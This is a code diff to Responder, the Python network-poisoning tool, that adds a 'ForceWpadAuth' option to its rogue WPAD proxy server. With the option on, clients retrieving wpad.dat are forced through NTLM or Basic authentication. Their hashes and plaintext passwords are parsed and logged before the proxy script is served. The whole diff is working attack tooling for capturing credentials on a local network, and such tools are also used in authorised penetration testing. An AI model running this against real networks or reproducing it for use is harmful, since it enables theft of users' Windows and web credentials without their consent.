@@ -38,6 +38,8 @@ parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "T
 
 parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is On", metavar="Off", choices=['On','on','off','Off'], default="On")
 
+parser.add_option('-F','--ForceWpadAuth', action="store", dest="Force_WPAD_Auth", help = "Set this to On or Off to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Default value is Off", metavar="Off", choices=['On','on','off','Off'], default="Off")
+
 parser.add_option('--lm',action="store", help="Set this to On if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is Off", metavar="Off",dest="LM_On_Off", choices=['On','on','off','Off'], default="Off")
 
 parser.add_option('-v',action="store_true", help="More verbose",dest="Verbose")
@@ -83,6 +85,7 @@ Basic = options.Basic.upper()
 Finger_On_Off = options.Finger.upper()
 INTERFACE = options.INTERFACE
 Verbose = options.Verbose
+Force_WPAD_Auth = options.Force_WPAD_Auth.upper()
 
 if INTERFACE != "Not set":
    BIND_TO_Interface = INTERFACE
@@ -1045,13 +1048,15 @@ def GrabCookie(data,host):
 def WpadCustom(data,client):
     Wpad = re.search('(/wpad.dat|/*\.pac)', data)
     if Wpad:
-       Message = "[+]WPAD file sent to: %s"%(client)
-       if Verbose:
-          print Message
-       logging.warning(Message)
        buffer1 = WPADScript(Payload=WPAD_Script)
        buffer1.calculate()
        return str(buffer1)
+    else:
+       return False
+
+def WpadForcedAuth(Force_WPAD_Auth):
+    if Force_WPAD_Auth == "ON":
+       return True
     else:
        return False
 
@@ -1112,11 +1117,13 @@ def GrabURL(data, host):
 def PacketSequence(data,client):
     Ntlm = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
     BasicAuth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
+
     if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
        File = config.get('HTTP Server', 'ExecFilename')
        buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
        buffer1.calculate()
        return str(buffer1)
+
     if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
        if IsExecutable(FILENAME):
           buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
@@ -1126,6 +1133,7 @@ def PacketSequence(data,client):
           buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
           buffer1.calculate()
           return str(buffer1)
+
     if Ntlm:
        packetNtlm = b64decode(''.join(Ntlm))[8:9]
        if packetNtlm == "\x01":
@@ -1135,14 +1143,23 @@ def PacketSequence(data,client):
           r.calculate()
           t = IIS_NTLM_Challenge_Ans()
           t.calculate(str(r))
-          buffer1 = str(t)                    
+          buffer1 = str(t)                   
           return buffer1
        if packetNtlm == "\x03":
           NTLM_Auth= b64decode(''.join(Ntlm))
           ParseHTTPHash(NTLM_Auth,client)
-          buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
-          buffer1.calculate()
-          return str(buffer1)
+          if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
+             Message = "[+]WPAD (auth) file sent to: %s"%(client)
+             if Verbose:
+                print Message
+             logging.warning(Message)
+             buffer1 = WpadCustom(data,client)
+             return buffer1
+          else:
+             buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
+             buffer1.calculate()
+             return str(buffer1)
+
     if BasicAuth:
        GrabCookie(data,client)
        GrabURL(data,client)
@@ -1151,9 +1168,17 @@ def PacketSequence(data,client):
           print "[+]HTTP-User & Password:", b64decode(''.join(BasicAuth))
           WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
        logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
-       buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
-       buffer1.calculate()
-       return str(buffer1)
+       if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
+          Message = "[+]WPAD (auth) file sent to: %s"%(client)
+          if Verbose:
+             print Message
+          logging.warning(Message)
+          buffer1 = WpadCustom(data,client)
+          return buffer1
+       else:
+          buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
+          buffer1.calculate()
+          return str(buffer1)
 
     else:
        return str(Basic_Ntlm(Basic))
@@ -1162,19 +1187,24 @@ def PacketSequence(data,client):
 class HTTP(BaseRequestHandler):
 
     def handle(self):
-        try: 
+        try:
            while True:
-              self.request.settimeout(0.1)
+              self.request.settimeout(1)
               data = self.request.recv(8092)
               buff = WpadCustom(data,self.client_address[0])
-              if buff:
+              if buff and Force_WPAD_Auth == "OFF":
+                 Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
+                 if Verbose:
+                   print Message
+                 logging.warning(Message)
                  self.request.send(buff)
               else:
                  buffer0 = PacketSequence(data,self.client_address[0])
-                 self.request.sendall(buffer0)
+                 self.request.send(buffer0)
         except Exception:
            pass#No need to be verbose..
            self.request.close()
+
 
 ##################################################################################
 #HTTP Proxy Stuff
@@ -1345,8 +1375,11 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
                           OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
                           WriteData(OutFile,Message, Message)
                     if data:
-                        out.send(data)
-                        count = 0
+                        try:
+                           out.send(data)
+                           count = 0
+                        except:
+                           pass
             if count == max_idling: 
                break
         return None
